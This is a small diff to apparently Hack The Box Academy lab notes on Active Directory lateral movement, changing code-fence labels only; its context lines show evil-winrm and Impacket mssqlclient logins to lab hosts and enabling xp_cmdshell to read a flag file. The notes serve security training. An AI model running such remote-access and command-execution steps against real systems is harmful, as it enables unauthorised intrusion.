@@ -83,7 +83,7 @@ From our Linux attack host, we can use the tool evil-winrm to connect.
 
 ### Connecting to a Target with Evil-WinRM and Valid Credentials
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ evil-winrm -i 10.129.201.234 -u forend
 
 Enter Password: 
@@ -149,7 +149,7 @@ Microsoft SQL Server 2017 (RTM) - 14.0.1000.169 (X64) ...
 
 We can also authenticate from our Linux attack host using mssqlclient.py from the Impacket toolkit.
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
 Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation
 
@@ -246,7 +246,7 @@ RDP to **10.129.45.32** (ACADEMY-EA-MS01), with user `htb-student` and password 
         Pinging ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL [172.16.5.150] with 32 bytes of data:
         ```
    - Login as SQLADMIN to the ACADEMY-EA-DB01 host, enable xp_cmdshell and read the flag:
-        ```sh
+        ```shellsession
         $mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
         SQL> enable_xp_cmdshell
         SQL> xp_cmdshell more C:\Users\damundsen\Desktop\flag.txt
